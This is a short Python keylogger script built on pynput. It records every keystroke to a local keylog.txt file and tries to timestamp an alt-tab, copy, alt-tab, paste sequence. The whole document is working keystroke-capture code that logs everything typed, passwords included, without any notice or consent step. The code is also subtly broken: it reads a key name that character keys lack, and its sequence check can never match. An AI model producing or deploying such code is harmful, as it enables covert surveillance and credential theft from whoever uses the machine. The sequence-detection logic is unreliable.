from pynput import keyboard
import time

SEQUENCE = ['alt', 'tab', 'ctrl_c', 'alt', 'tab', 'ctrl_v']

def check_sequence(keys_pressed):
    if len(keys_pressed) < len(SEQUENCE):
        return False
    for i in range(len(SEQUENCE)):
        if keys_pressed[-len(SEQUENCE) + i] != SEQUENCE[i]:
            return False
    return True

def keypressed(key):
    print(str(key))
    with open("keylog.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char+ '\n')
        except AttributeError:
            # If the key doesn't have a char attribute, log its name
            logkey.write(f"[{key.name}]\n") 

    # Append the key name to the list of pressed keys
    keys_pressed.append(key.name)
    
    # Check if the sequence has been pressed
    if check_sequence(keys_pressed):
        # Log the timestamp when the sequence is pressed
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with open("keylog.txt", 'a') as logkey:
            logkey.write(f"Sequence pressed at: {timestamp}\n")
        # Clear the list of pressed keys
        keys_pressed.clear()

# Initialize the list of pressed keys
keys_pressed = []

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
